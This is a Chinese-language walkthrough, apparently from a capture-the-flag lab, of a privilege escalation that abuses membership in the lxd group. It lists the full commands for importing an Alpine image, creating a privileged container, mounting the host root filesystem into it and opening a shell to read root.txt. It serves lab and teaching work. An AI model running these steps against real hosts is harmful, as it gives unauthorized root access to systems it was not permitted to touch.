利用LXD配置不当（普通用户加入lxd组）进行权限提升 

//step.1 下载镜像
	git clone https://github.com/saghul/lxd-alpine-builder
	
//step.2 上传至目标机器
	由于靶机环境不通github，这里我是下载到本机，然后通过'python -m http.server 80' 和'wget命令' 进行传输。注意目标机器切换至/tmp目录下，以防止权限不足。

//step.3 将镜像文件导入到 LXD 的本地镜像存储中。
    lxc image import ./alpine*.tar.gz --alias test  
    	//--alias test的意思是为镜像命名。
//step.4 创建特权容器。使用别名 test镜像，创建一个名为 rongqi的新容器
	lxc init test rongqi -c security.privileged=true 
		//-c security.privileged=true 这是关键且危险的配置。它意味着容器内的 root 用户将拥有与宿主机 root 用户几乎相同的权限。容器内的 root 可以操作主机内核的许多特性，这严重削弱了容器的隔离性，仅应在完全信任容器内操作或进行特定调试时使用。
		
//step.5 挂载主机目录至容器
	lxc config device add rongqi guazai disk source=/ path=/mnt/root recursive=true
		//disk source=/ path=/mnt/root recursive=true ：将宿主机的根目录（source=/）挂载到容器内的 /mnt/root路径下。

//step.6 启动并进入容器
	lxc start rongqi //启动
	 lxc exec rongqi -- /bin/sh  //进入
	 
最后切换至/mnt/root/root目录下即可发现root.txt文件，另外一个user.txt在/home/mike的目录下.
----------------------------------------------------------
//实操时，发生一些问题，一开始是将根目录挂载至容器的/mnt/root目录下，但访问不到flag文件。试了挺久也不行，最后进行了以下修改：将root目录挂载至容器的/mnt/flag目录下。毕竟目的只是为了root.txt
